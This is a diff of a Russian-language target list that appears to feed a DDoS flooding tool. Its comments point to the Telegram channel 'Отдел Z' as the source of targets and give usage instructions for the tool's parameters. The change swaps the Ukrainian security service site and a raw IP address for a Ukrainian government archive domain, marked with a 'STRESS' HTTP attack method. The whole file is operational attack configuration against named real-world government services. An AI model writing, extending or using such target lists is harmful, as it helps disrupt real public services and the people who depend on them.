@@ -1,6 +1,6 @@
 ### Цели выбираются и анонсируются в канале Отдел Z https://t.me/departmentruZ
 ### Не забываем, удалять все параметры: -t --rpc -p --debug. UDP в список не добавляем
 
-#ssu.gov.ua
-https://ssu.gov.ua --http-methods STRESS
-tcp://194.32.111.6:443
+#archivzp.gov.ua
+archivzp.gov.ua --http-methods STRESS
+
